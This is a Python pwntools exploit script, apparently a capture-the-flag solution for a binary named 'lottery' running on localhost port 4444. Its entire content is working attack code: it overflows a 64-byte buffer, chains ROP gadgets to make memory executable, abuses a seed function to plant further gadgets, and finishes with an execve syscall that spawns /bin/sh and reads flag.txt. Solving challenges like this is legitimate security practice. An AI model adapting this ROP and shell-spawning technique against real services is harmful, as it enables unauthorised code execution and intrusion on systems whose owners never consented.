from pwn import *
import re
import sys
context.terminal = ['termite','-e']

elf = ELF("./lottery")

rop = ROP(elf)

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]

add_rdi_rsp_seed = 0xba0a79 ^ 0xc35ac35f
other_seed = 0x6730b ^ 0xc35ac35f

add_rdi_rsp = 0x20000000 + 0x1f
syscall = 0x10000000 + 0x1d
pop_rsi = 0x10000000 + 0x2b

p = remote("localhost",4444)

def send_payload(payload):
	buf = b"A" * 64 + p64(0)
	buf += payload
	buf += p64(elf.symbols['ask_name'])
	p.sendline(buf)
	p.recvline()


def make_executable(address):
	buf = b""
	buf += p64(pop_rdx)
	buf += p64(7)
	buf += p64(pop_rdi)
	buf += p64(address)
	buf += p64(elf.symbols['protect']+8)
	buf += p64(elf.symbols['ask_name'])
	send_payload(buf)

def set_seed(seed):
	buf = p64(pop_rdi)
	buf += p64(seed)
	buf += p64(elf.symbols['seed']+17)
	buf += p64(elf.symbols['generate_winning_numbers'])
	send_payload(buf)
	

def fill_buffers():
	set_seed(add_rdi_rsp_seed)
	send_payload(p64(elf.symbols['cheat']))
	set_seed(other_seed)

p.sendline("3")

make_executable(0x10000000)
make_executable(0x20000000)
fill_buffers()

buf = p64(pop_rax) + p64(59)
buf += p64(pop_rsi) + p64(0)
buf += p64(pop_rdx) + p64(0)
buf += p64(pop_rdi) + p64(8)
buf += p64(add_rdi_rsp)
buf += p64(syscall) + b"/bin/sh" + p64(0)
send_payload(buf)
p.sendline("cat flag.txt;exit")
print("flag:", re.search(b"gigem{.*}", p.recvall()).group(0).decode('ascii'))
